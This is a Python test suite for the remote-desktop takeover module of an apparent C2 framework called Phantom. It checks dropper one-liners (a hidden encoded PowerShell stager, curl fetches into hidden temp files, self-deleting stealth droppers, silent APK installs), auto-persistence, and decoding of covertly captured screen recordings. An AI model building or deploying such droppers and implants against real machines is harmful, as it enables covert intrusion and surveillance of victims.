"""Tests for the Remote Session module (GUI takeover).

Covers what is testable without a compiler / without a live target:

  * dropper generation for each platform (valid one-liner, correct URL shape)
  * the C2 server serves the compiled remote binaries on /api/v1/remote_payload_*
  * the C2 result handler turns REMOTE_FRAME_B64 output into a real artifact
    file in data/remote/ (JPEG magic sniffed → .jpg)
  * unknown remote payload path → 404, unauthenticated → 403
"""
import base64
import os
import unittest
from unittest.mock import patch


class RemoteDropperTests(unittest.TestCase):
    def _dropper(self, platform):
        from phantom.utils.builder import generate_remote_dropper
        return generate_remote_dropper(platform, "10.0.0.5", 8443, use_ssl=True)

    def test_windows_dropper_is_powershell_stager(self):
        d = self._dropper("windows")
        self.assertTrue(d.startswith("powershell -NoP -NonI -W Hidden -Exec Bypass -Enc "))
        # The URL inside must reference the remote module endpoint
        import base64 as b64
        decoded = b64.b64decode(d.rsplit(" ", 1)[1] + "==")
        script = decoded.decode("utf-16-le")
        self.assertIn("/api/v1/remote_payload_windows", script)
        self.assertIn("10.0.0.5:8443", script)

    def test_linux_dropper_fetches_remote_payload(self):
        d = self._dropper("linux")
        self.assertIn("curl -sk", d)
        self.assertIn("/api/v1/remote_payload_linux", d)
        self.assertIn("/tmp/.rdesk", d)
        self.assertIn("10.0.0.5", d)

    def test_macos_dropper(self):
        d = self._dropper("macos")
        self.assertIn("/api/v1/remote_payload_macos", d)

    def test_unsupported_platform_empty(self):
        from phantom.utils.builder import generate_remote_dropper
        # iOS has no MediaProjection/input-injection API: explicitly unsupported.
        self.assertEqual(generate_remote_dropper("ios", "h", 1), "")

    def test_stealth_dropper_self_deletes_on_posix(self):
        """The no-disk stager fetches the OS payload, starts it, then unlinks
        the on-disk copy."""
        from phantom.utils.builder import generate_stealth_dropper
        for platform in ("linux", "macos"):
            cmd = generate_stealth_dropper(platform, "10.0.0.5", 8443)
            self.assertIn(f"/api/v1/payload_{platform}", cmd)
            self.assertIn("rm -f", cmd)
            self.assertIn("nohup", cmd)

    def test_stealth_dropper_android_installs_then_removes_apk(self):
        from phantom.utils.builder import generate_stealth_dropper
        cmd = generate_stealth_dropper("android", "10.0.0.5", 8443)
        self.assertIn("/api/v1/payload_android", cmd)
        self.assertIn("pm install", cmd)
        self.assertIn("rm -f", cmd)

    def test_stealth_dropper_windows_is_inmemory(self):
        """Windows delegates to the PIC stager: the beacon runs fully in
        memory, so there is no on-disk beacon file to delete."""
        from phantom.utils.builder import generate_stealth_dropper, generate_dropper
        self.assertEqual(generate_stealth_dropper("windows", "10.0.0.5", 8443),
                         generate_dropper("windows", "10.0.0.5", 8443,
                                          dl_port=8443, use_ssl=True))

    def test_android_dropper_installs_apk(self):
        """Android is supported: the dropper fetches the APK, installs it and
        launches the bootstrap activity (needs an existing shell)."""
        d = self._dropper("android")
        self.assertIn("/api/v1/remote_payload_android", d)
        self.assertIn("pm install", d)
        self.assertIn("com.phantom.remote/.MainActivity", d)
        self.assertIn("10.0.0.5", d)


class RemoteC2RouteTests(unittest.TestCase):
    def test_route_registered(self):
        """The C2 app must expose the three remote payload routes."""
        from phantom.core.c2_server import C2Server
        srv = C2Server()
        app = srv._setup_app()
        paths = {r.resource.canonical for r in app.router.routes()
                 if getattr(r, "resource", None) and r.resource.canonical}
        for p in ("/api/v1/remote_payload_windows",
                  "/api/v1/remote_payload_linux",
                  "/api/v1/remote_payload_macos",
                  "/api/v1/remote_payload_android"):
            self.assertIn(p, paths)

    @patch("phantom.core.c2_server.get_payload_token", return_value="tok123")
    def test_payload_requires_token(self, _tok):
        """The payload handler rejects requests without a valid auth token."""
        from phantom.core import c2_server

        class FakeRequest:
            path = "/api/v1/remote_payload_linux"
            query = {}
            headers = {}
            remote = "127.0.0.1"

        import asyncio
        loop = asyncio.new_event_loop()
        try:
            resp = loop.run_until_complete(
                c2_server.handle_payload(FakeRequest()))
        finally:
            loop.close()
        self.assertEqual(resp.status, 403)

    @patch("phantom.core.c2_server.get_payload_token", return_value="tok123")
    def test_payload_serves_remote_binary_with_token(self, _tok):
        """With the right token and a compiled binary, the handler serves it."""
        from phantom.core import c2_server
        import os

        class FakeRequest:
            path = "/api/v1/remote_payload_linux"
            query = {"auth": "tok123"}
            headers = {}
            remote = "127.0.0.1"

        base = os.path.dirname(os.path.dirname(os.path.abspath(c2_server.__file__)))
        fake_bin = os.path.join(base, "payloads", "remote", "remote_linux")
        with open(fake_bin, "wb") as f:
            f.write(b"\x7fELF-fake-remote-binary")
        try:
            import asyncio
            loop = asyncio.new_event_loop()
            try:
                resp = loop.run_until_complete(
                    c2_server.handle_payload(FakeRequest()))
            finally:
                loop.close()
            self.assertEqual(resp.status, 200)
            self.assertEqual(resp.body, b"\x7fELF-fake-remote-binary")
        finally:
            os.unlink(fake_bin)

    def test_remote_binary_path_uses_remote_dir(self):
        """The payload handler must look in payloads/remote/ for remote binaries."""
        from phantom.core import c2_server
        import os
        base = os.path.dirname(os.path.dirname(os.path.abspath(c2_server.__file__)))
        for filename in ("remote.exe", "remote_linux", "remote_macos", "remote.apk"):
            p = os.path.join(base, "payloads", "remote", filename)
            self.assertTrue(p.startswith(os.path.join(base, "payloads", "remote")))


class ScreenRecordingArtifactTests(unittest.TestCase):
    """The C2 must decode the three screen-recording output forms into real
    artifacts (not a wall of base64) and buffer live segments for the UI."""

    @staticmethod
    def _phrec(n_frames: int = 3) -> str:
        import struct
        body = b"PHREC" + struct.pack("<I", n_frames)
        jpg = b"\xff\xd8\xff\xe0" + b"\x00" * 32
        for i in range(n_frames):
            body += struct.pack("<II", i * 500, len(jpg)) + jpg
        return base64.b64encode(body).decode()

    def test_passive_recording_saves_frames(self):
        from phantom.core.c2_server import C2State
        st = C2State()
        st.update_beacon("REC001", {"ip": "10.0.0.9", "os": "windows"})
        with patch("phantom.utils.paths.data_dir",
                   return_value="/tmp/phantom_rec_test"):
            st.add_result("REC001", "rec-1-1", "SCREENREC_B64:" + self._phrec())
        results = st.get_results("REC001")
        self.assertEqual(len(results), 1)
        self.assertIn("Screen recording saved", results[0]["output"])

    def test_live_segment_buffered(self):
        from phantom.core.c2_server import C2State
        st = C2State()
        st.update_beacon("REC002", {"ip": "10.0.0.9", "os": "windows"})
        jpg = base64.b64encode(b"\xff\xd8\xff\xe0\x00" * 16).decode()
        with patch("phantom.utils.paths.data_dir",
                   return_value="/tmp/phantom_rec_test2"):
            st.add_result("REC002", "live-seg-1", "SCREEN_LIVE_SEG:" + jpg)
            st.add_result("REC002", "live-seg-2", "SCREEN_LIVE_SEG:" + jpg)
        segs = st.get_live_segments("REC002")
        self.assertEqual(len(segs), 2)
        self.assertEqual(segs[0]["seq"], 1)
        results = st.get_results("REC002")
        self.assertIn("Live stream segment", results[0]["output"])

    def test_dump_saved_as_mp4(self):
        from phantom.core.c2_server import C2State
        st = C2State()
        st.update_beacon("REC003", {"ip": "10.0.0.9", "os": "windows"})
        fake_mp4 = b"\x00\x00\x00\x18ftypmp42" + b"\x00" * 40
        with patch("phantom.utils.paths.data_dir",
                   return_value="/tmp/phantom_rec_test3"):
            st.add_result("REC003", "dump-1",
                          "SCREEN_DUMP:" + base64.b64encode(fake_mp4).decode())
        results = st.get_results("REC003")
        self.assertIn("Screen recording dump", results[0]["output"])

    def test_live_api_endpoint(self):
        import asyncio
        from phantom.core.c2_server import C2State
        from phantom.api.server import create_app
        st = C2State()
        st.update_beacon("REC004", {"ip": "10.0.0.9", "os": "windows"})
        jpg = base64.b64encode(b"\xff\xd8\xff\xe0\x00" * 16).decode()
        st.add_result("REC004", "live-seg-1", "SCREEN_LIVE_SEG:" + jpg)

        async def _go():
            from phantom.utils.c2_crypto import get_api_token
            app = create_app()
            # the module-level c2_state is what the endpoint reads
            from phantom.api import server as api_mod
            api_mod.c2_state = st
            from aiohttp.test_utils import TestClient, TestServer
            client = TestClient(TestServer(app))
            await client.start_server()
            try:
                async with client.get(
                        "/api/c2/recordings/live?beacon_id=REC004",
                        headers={"Authorization": f"Bearer {get_api_token()}"}) as resp:
                    self.assertEqual(resp.status, 200)
                    data = await resp.json()
                    self.assertEqual(data["count"], 1)
                    self.assertEqual(data["beacon_id"], "REC004")
            finally:
                await client.close()

        loop = asyncio.new_event_loop()
        try:
            loop.run_until_complete(_go())
        finally:
            loop.close()


class RemoteFrameArtifactTests(unittest.TestCase):
    def _jpg_bytes(self):
        # Minimal valid JPEG header (magic bytes are what the sniffer reads)
        return b"\xff\xd8\xff\xe0" + b"\x00" * 64

    def test_frame_b64_saved_as_artifact(self):
        from phantom.core.c2_server import C2State
        st = C2State()
        st.update_beacon("R-TEST01", {"ip": "10.0.0.9", "os": "windows"})
        jpg = self._jpg_bytes()
        out = "REMOTE_FRAME_B64:" + base64.b64encode(jpg).decode()
        with patch("phantom.utils.paths.data_dir",
                   return_value="/tmp/phantom_remote_test_data"):
            st.add_result("R-TEST01", "frame-1-1", out)
        results = st.get_results("R-TEST01")
        self.assertEqual(len(results), 1)
        self.assertIn("Remote frame captured", results[0]["output"])

    def test_frame_does_not_break_on_garbage(self):
        from phantom.core.c2_server import C2State
        st = C2State()
        st.update_beacon("R-TEST02", {"ip": "10.0.0.9", "os": "windows"})
        with patch("phantom.utils.paths.data_dir",
                   return_value="/tmp/phantom_remote_test_data2"):
            st.add_result("R-TEST02", "frame-2-1", "REMOTE_FRAME_B64:@@not-base64@@")
        results = st.get_results("R-TEST02")
        self.assertEqual(len(results), 1)
        # decode failure is recorded, never a crash
        self.assertIn("Remote frame", results[0]["output"])

    def test_remote_beacon_registers_with_r_prefix(self):
        from phantom.core.c2_server import C2State
        st = C2State()
        st.update_beacon("R-ABC123", {"ip": "10.0.0.9", "os": "linux"})
        self.assertIn("R-ABC123", st.get_beacons())
        # auto-persist queued for the remote module too
        self.assertTrue(any(t["command"] == "persist"
                            for t in st.tasks.get("R-ABC123", [])))


class RecordingsViewerTests(unittest.TestCase):
    """The CLI browser player (recordings_viewer) serves the page, lists
    saved recordings and live segment status, and never serves a file
    through a path traversal."""

    def _run(self, coro):
        import asyncio
        loop = asyncio.new_event_loop()
        try:
            return loop.run_until_complete(coro(loop))
        finally:
            try:
                loop.run_until_complete(asyncio.sleep(0))
            except Exception:
                pass
            loop.close()

    def test_index_served(self):
        from aiohttp.test_utils import TestClient, TestServer
        from phantom.core.recordings_viewer import make_app

        async def _go(loop):
            client = TestClient(TestServer(make_app()))
            await client.start_server()
            try:
                async with client.get("/") as r:
                    self.assertEqual(r.status, 200)
                    html = await r.text()
                    self.assertIn("PHANTOM", html)
                    self.assertIn("screen recordings", html)
            finally:
                await client.close()

        self._run(_go)

    def test_listing_and_live_endpoints(self):
        from aiohttp.test_utils import TestClient, TestServer
        from phantom.core.recordings_viewer import make_app

        async def _go(loop):
            client = TestClient(TestServer(make_app()))
            await client.start_server()
            try:
                async with client.get("/list") as r:
                    data = await r.json()
                    self.assertIn("recordings", data)
                    self.assertIsInstance(data["recordings"], list)
                async with client.get("/live") as r:
                    data = await r.json()
                    self.assertIn("count", data)
                    self.assertIn("beacon", data)
                    self.assertIn("mp4", data)
            finally:
                await client.close()

        self._run(_go)

    def test_path_traversal_blocked(self):
        """basename() neutralizes ../ — the endpoint must never serve a
        file outside data/recordings/ (400/404, never 200)."""
        from aiohttp.test_utils import TestClient, TestServer
        from phantom.core.recordings_viewer import make_app

        async def _go(loop):
            client = TestClient(TestServer(make_app()))
            await client.start_server()
            try:
                for qs in (
                        "dir=recordings&name=../evil.mp4",
                        "dir=recordings/live&name=..%2F..%2Fsecret.mp4",
                        "dir=recordings&name=%2Fetc%2Fpasswd"):
                    async with client.get("/play?" + qs) as r:
                        self.assertIn(r.status, (400, 404))
            finally:
                await client.close()

        self._run(_go)


if __name__ == "__main__":
    unittest.main()